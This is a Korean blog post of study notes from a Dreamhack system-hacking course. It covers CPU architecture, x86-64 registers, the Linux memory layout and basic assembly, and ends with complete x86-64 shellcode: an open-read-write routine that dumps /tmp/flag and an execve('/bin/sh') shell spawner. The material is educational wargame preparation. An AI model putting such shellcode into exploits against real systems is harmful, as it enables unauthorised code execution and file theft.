@@ -1,0 +1,298 @@
+---
+title: "[Dreamhack] System Hacking 로드맵 부수기 (1)"
+date: "2024-07-11"
+tags: ["dreamhack", "system_hacking"]
+draft: false
+summary: "드림핵 딱대~~ 방학동안 부숴버릴테니까..."
+---
+
+# BG - Computer Science 01
+
+CPU는 아키텍처 별 다양한 명령어 집합 구조(ISA)를 가지고 있다.
+여기서 폰 노이만 구조와 x86-64 아키텍처에 대해 설명한다.
+
+## 폰 노이만 구조
+
+컴퓨터 과학자 폰 노이만은 연산, 제어, 저장의 핵심 기능이 필요하다고 생각했다. 현재 근대 컴퓨터의 구조 역시 대부분 연산과 제어를 맡는 중앙처리장치(CPU), 연산 내용을 저장하는 저장장치(메모리), 이 둘이 통신하기 위한 길을 맡는 버스가 있다.
+
+> CPU 내부에는 ALU라고 불리는 연산장치와 이를 제어하는 제어장치, 이 내용들을 빠르게 저장하는 레지스터, 캐시 메모리로 구성되어 있다.
+
+> 저장장치는 운영체제와 응용 프로그램이 돌아가는 주 기억장치인, RAM과 모든 데이터가 반영구적으로 저장되는 보조 기억장치인, SSD와 HDD가 있다.
+
+> 버스는 데이터가 이동하기 위한 데이터 버스와 주소를 지정하기 위한 주소 버스, 읽기/쓰기를 제어하기 위한 제어 버스가 있다. 이외로 랜선, 데이터 통신 소프트웨어, 프로토콜 등도 버스라고 칭한다.
+
+추가적으로 CPU 내에 있는 레지스터와 캐시 메모리는 왜 있냐면 한마디로 RAM이 아무리 빨라봤자 CPU 속도를 못 따라잡기 때문에 생기는 병목현상을 줄이고자 만들어졌다. 연산장치의 결과값 같은게 임시로 저장하는 값이 들어간다.
+
+## 명령어 집합 구조
+
+Instruction Set Architecture, ISA, 아키택처 라고 부르는 CPU가 알아먹는 명령어의 집합이라고 생각하면 된다. 한마디로 기계어(명령어)를 읽고 CPU는 이에 맞춰서 처리한다.
+
+ISA는 ARM, x86-64(AMD64), MIPS, AVR 등 다양하게 존재한다. 이렇게 많은 ISA가 있는 이유는 각기 다른 환경에서 작동되는 녀석들이기 때문이다.
+
+x86-64는 고성능 프로세싱에 사용된다. 대표적으로 데스크탑, 랩탑 등에서 많이 사용한다. 하지만 전력 효율이 꽝이고 그만큼 열이 많이 발생한다. 그의 반면 ARM은 저성능 프로세싱에 사용된다. 대표적으로 공유기, 스마트 TV 등 임베디드 시스템에 많이 적용된다. 성능은 낮으나 x80-64대비 전력 효율이 미친 수준으로 좋고 그만큼 발열 또한 적다.
+
+많은 아키텍처 사이에 x86-64만을 배우는 이유는 가장 범용적으로 사용되기 때문이다. 컴퓨팅 시스템에 약 56%가 사용하고 있는 아키텍처이다.
+
+## x86-64 아키텍처
+
+1999년, AMD는 Intel 사의 32비트 아키텍처인 IA-32를 64비트로 확장시켜 AMD64라는 이름으로 발표했다.
+AMD64가 주목을 받자, 동종업계에서 이를 기반한 다양한 아키텍쳐를 출시하게 된다. 여기서 살아남은게 바로 x86-64 아키텍처다.
+
+### n 비트 아키텍처
+
+위 64비트 아키텍처와 같이 n 비트 아키텍처라고 부르는데 이게 과연 무엇인가?
+바로 CPU가 한번에 처리할 수 있는 데이터의 크기이다.
+
+이를 CS 쪽에선 'WORD'라는 단위로 부른다. WORD의 크기의 따라서 CPU의 처리 속도 등과 관련한 다양한 변화가 생긴다.
+
+### WORD가 크면 유리한 점
+
+대표적으로 가상메모리 제공과 관련된 부분이다.
+
+32 비트 아키텍처로는 가상 메모리를 고작 4GB 밖에 줄 수가 없다. 이걸로는 게임과 같은 고사양 프로그램을 돌리기엔 택도 없다.
+
+이래서 64 비트 아키텍처는 가상메모리가 이론상 16EB(엑사바이트)까지 제공이 가능하다. 절대적으로 부족하지 않을 수준이기에 아무리 크고 무거운 프로그램이라도 ㅆㄱㄴ이기에 WORD가 크면 확실하게 유리한 점이 있기에 사용하는 것이다.
+
+### 범용 레지스터
+
+범용 레지스터는 주용도가 있지만 다양하게 저장해서 사용할 수 있다. 범용 레지스터 각각 8바이트를 저장할 수 있다.
+
+- rax(accumulator register): 함수의 반환 값
+- rbx(base register): 주된 용도 X
+- rcx(counter register): 반복문의 반복 횟수, 각종 연산의 시행 횟수
+- rdx(data register): 주된 용도 X
+- rsi(source index): 데이터를 옮길 때 원본을 가리키는 포인터
+- rdi(destination index): 데이터를 옮길 때, 목적지를 가리키는 포인터
+- rsp(stack pointer): 사용중인 스택의 위치를 나타내는 포인터
+- rbp(stack base pointer): 사용중인 스택의 최하단을 가리키는 포인터
+
+### 명령어 포인터 레지스터
+
+현재 CPU가 처리하는 프로그램 내 명령어를 어디를 실행중인지 가르키는 레지스터.
+
+- rip -> 8바이트
+
+### 플래그 레지스터
+
+현재 CPU의 상태를 저장하고 있는 레지스터
+
+64비트 아키텍처에선 RFLAGS라고 부르고 과거 16비트 플래그 레지스터를 확장시켜 64비트로 만들어져 있다.
+
+대표적으로 아래의 플래그를 많이 사용한다.
+
+- CF(Carry Flag): 부호 없는 수의 연산 결과가 비트의 범위를 넘을 경우 설정됨.
+- ZF(Zero Flag): 연산의 결과가 0일 경우 설정됨.
+- SF(Sign Flag): 연산의 결과가 음수일 경우 설정됨.
+- OF(Overflow Flag): 부호 있는 수의 연산 결과가 비트 범위를 넘을 경우 설정됨.
+
+ex) 3의 값을 갖는 a와 5의 값을 갖는 b가 있을때, a에서 b를 빼는 연산을 하면, 연산의 결과가 음수이기에, SF가 설정됨.
+
+### 레지스터 호환
+
+rdi, rsi와 같은 x64 아키텍처 레지스터 이외의 edi, esi와 같은 IA-32, IA-16에서 쓰는 레지스터는 고대로 사용할 수 있음.
+
+# BG - Linux Memory Layout
+
+## 리눅스 메모리 구조
+
+리눅스에는 메모리를 5가지의 세그먼트로 구분한다.
+
+- 코드 세그먼트: 코드가 위치하는 영역. 읽기, 실행 권한이 부여됨
+
+- 데이터 세그먼트: 컴파일 시점에 값이 정해진 전역 변수, 상수가 위치하는 영역. 아래와 같이 권한이 부여됨.
+
+  - 읽기와 쓰기권한이 같이 부여되는 경우를 data 세그먼트, 읽기만 부여되면 rodata 세그먼트라고 부름.
+
+- BSS세그먼트: 초기화되지 않은 전역 변수가 위치하는 영역. 읽기, 쓰기 권한이 부여됨.
+
+  - 전역 변수가 초기화되어 있지 않은 상태에서 프로그램이 시작될 때, 모두 0으로 값이 초기화됨.
+
+- 스택 세그먼트: 프로세스와 스택이 위치한 영역. 함수의 인자, 지역 변수 같은 임시 변수들이 있는 곳.
+
+  - 스택 세그먼트에는 스택 프레임이라는 단위를 사용함.
+  - 스택 프레임은 함수가 호출될 때 생성, 반환될 때 해제됨.
+  - 근데 코드별로 얼마나 줘야하는지 각기 다르기 때문에 초기 스택 프레임에서 부족할 때마다 확장시켜줌.
+  - 그래서 스택은 동적으로 구동됨. 위에서 아래로 자라게 되고 읽기, 쓰기 권한이 부여됨.
+
+- 힙 세그먼트: 힙 데이터가 위치하는 영역. C언어에선 malloc(), calloc() 같은 애들이 위치하는 공간임.
+  - 스택처럼 동적으로 구동됨. 스택과 반대방향으로 자람.
+
+스택과 힙은 왜 방향이 서로 반대로 자라냐면, 만일 같은 방향으로 자라게 되면 둘다 동적으로 움직이기에 주소 충돌이 계속 일어날거임. 그래서 걍 하나를 뒤집어서 자라게 만들어 놓은것.
+
+# BG - x86 Assembly
+
+어셈블리 언어: 기계어로 코딩하던 개발자들의 의해서 만들어진 최초의 문자형 프로그래밍 언어. 이 때 컴퓨터가 해석할 수 있게 어셈블러를 개발했다.
+
+이때 기계어를 어셈블리어로 바꿔주는 디스어셈블러가 개발되었다. 현재 대부분의 디버거 소프트웨어에 적용되어 있다.
+
+## 명령어
+
+```assembly
+mov eax, 3
+```
+
+위와 같은 구조를 가지고 있는데 mov는 명령어, eax와 3은 피연산자와 같은 방식으로 구성되어 있다.
+범용적이게 사용하는 명령어를 알아보자.
+
+- 데이터 이동: mov, lea
+- 산술 연산: inc, dec, add, sub
+- 논리 연산: and, or, xor, not
+- 비교: cmp, test
+- 분기(점프): jmp, je, jg
+- 스택: push, pop
+- 프로시저: call, ret, leave
+- 시스템 콜: syscall
+
+## 피연산자
+
+- 상수
+- 레지스터:
+- 메모리: 주소값으로 대괄호`[]`로 둘러싸여 있고 앞에 크기 지정자 `TYPE PTR`이 붙을 수 있음.
+  - 타입은 BYTE, WORD(2바이트), DWORD(4바이트), QWORD(8바이트)가 있음
+  - ex) `QWORD PTR [0xdeadbeef]` -> 0xdeadbeef의 데이터를 8바이트만큼 참조
+
+## 데이터 이동
+
+mov dst, src -> src의 값을 dst에 대입.
+
+1. `mov rdi, rsi` -> rsi 값을 rdi에 대입
+2. `mov QWORD PTR[rdi], rsi` -> rsi 값을 rdi가 가르키는 주소에 대입
+
+lea dst, src -> src의 유효주소를 dst에 저장.
+
+1. `lea rsi, [rbx+8rcx]` -> rbx+8\rcx 를 rsi에 대입.
+
+## 산술연산
+
+- add dst, src: dst에 src 값을 더함.
+- sub dst, src: dst에 src 값을 뺌.
+- inc: 값을 1 증가시킴.
+- dec: 값을 1 감소시킴.
+
+## 논리연산
+
+- and: 비트 AND 연산 진행.
+- or: 비트 OR 연산 진행.
+- xor: 비트 XOR 연산 진행.
+- not: 비트 전부 반전.
+
+## 비교
+
+- cmp: 두 값을 빼서 비교. 만일 같을 경우 값이 0이 되어 ZF 플래그가 설정됨을 확인해서 두 값이 같은지 판단.
+- test: 두 값을 AND 연산해서 비교. 이것도 ZF 플래그가 설정됨을 확인해서 두 값이 같은지 판단.
+
+## 분기(점프)
+
+rip를 이동시킴
+
+- jmp: 지정된 주소로 점프.
+- je: 직전에 비교한 두 연산자가 같으면 점프(jump equal)
+- jg: 직전에 비교한 두 연산자 중 전자가 더 크면 점프(jump greater)
+
+## 스택
+
+- push: 스택 최상단에 값을 쌓음
+- pop: 스택 최상단 값을 꺼내서 피연산자에 대입
+
+## 프로시저
+
+특정 기능을 수행하는 코드 조각. 이를 사용해 전체적인 코드 크기를 줄일 수 있음.
+이때 프로시저를 부르는걸 call이라고 말하고 부른 곳에서 받은 걸 return 이라고 함.
+갔다가 원래 실행 흐름으로 돌아와야 함으로 call 다음에 명령어 주소를 스택에 저장하고 프로시저로 rip 이동.
+
+- call: `push return_address; jmp addr` 프로시저 호출
+- leave: `mov rsp, rip; pop rbp` -> 스택프레임 정리
+  - ![](https://dreamhack-lecture.s3.amazonaws.com/media/55880e83b59d27afcaa1ebf55d4db32d9b5dfd049c712e89a4cb34dbfdcd6bc4.gif)
+- ret: `pop rip` -> return 주소로 반환
+
+## 시스템 콜
+
+유저모드 상태에서 커널모드인 시스템 소프트웨어한테 어떤 동작을 요청하는 것.
+
+- syscall: 시스템 콜 수행.
+  - 요청: rax
+    - x64 syscall 테이블 참고해서 값 넣으면 됌
+  - 인자 순서: rdi -> rsi -> rdx -> rcx -> r8 -> r9 -> stack
+
+# Shellcode
+
+shellcode: 익스플로잇을 위해 제작된 어셈블리 코드 조각.
+
+## orw shellcode
+
+인자 값을 이전에 학습한대로 테이블을 확인하고 맞는 인자값을 셋팅해주면 끝이다.
+
+### open shellcode
+
+```assembly
+push 0x67
+mov rax, 0x616c662f706d742f
+push rax
+mov rdi, rsp    ; rdi = "/tmp/flag"
+xor rsi, rsi    ; rsi = 0 ; RD_ONLY
+xor rdx, rdx    ; rdx = 0
+mov rax, 2      ; rax = 2 ; syscall_open
+syscall         ; open("/tmp/flag", RD_ONLY, NULL)
+```
+
+### read shellcode
+
+```assembly
+mov rdi, rax      ; rdi = fd
+mov rsi, rsp
+sub rsi, 0x30     ; rsi = rsp-0x30 ; buf
+mov rdx, 0x30     ; rdx = 0x30     ; len
+mov rax, 0x0      ; rax = 0        ; syscall_read
+syscall           ; read(fd, buf, 0x30)
+```
+
+### write shellcode
+
+```assembly
+mov rdi, 1        ; rdi = 1 ; fd = stdout
+mov rax, 0x1      ; rax = 1 ; syscall_write
+syscall           ; write(fd, buf, 0x30)
+```
+
+### 모두 합친 shellcode
+
+```assembly
+;Name: orw.S
+
+push 0x67
+mov rax, 0x616c662f706d742f
+push rax
+mov rdi, rsp    ; rdi = "/tmp/flag"
+xor rsi, rsi    ; rsi = 0 ; RD_ONLY
+xor rdx, rdx    ; rdx = 0
+mov rax, 2      ; rax = 2 ; syscall_open
+syscall         ; open("/tmp/flag", RD_ONLY, NULL)
+
+mov rdi, rax      ; rdi = fd
+mov rsi, rsp
+sub rsi, 0x30     ; rsi = rsp-0x30 ; buf
+mov rdx, 0x30     ; rdx = 0x30     ; len
+mov rax, 0x0      ; rax = 0        ; syscall_read
+syscall           ; read(fd, buf, 0x30)
+
+mov rdi, 1        ; rdi = 1 ; fd = stdout
+mov rax, 0x1      ; rax = 1 ; syscall_write
+syscall           ; write(fd, buf, 0x30)
+```
+
+위 코드를 C언어로 스켈레톤 코드로 작성 -> objdump로 디스어셈블링 -> orw-shellcode 추출.
+--> 이걸로 익스 ㄱㄱ
+
+## execve shellcode
+
+```assembly
+;Name: execve.S
+
+mov rax, 0x68732f6e69622f
+push rax
+mov rdi, rsp  ; rdi = "/bin/sh\x00"
+xor rsi, rsi  ; rsi = NULL
+xor rdx, rdx  ; rdx = NULL
+mov rax, 0x3b ; rax = sys_execve
+syscall       ; execve("/bin/sh", null, null)
+```
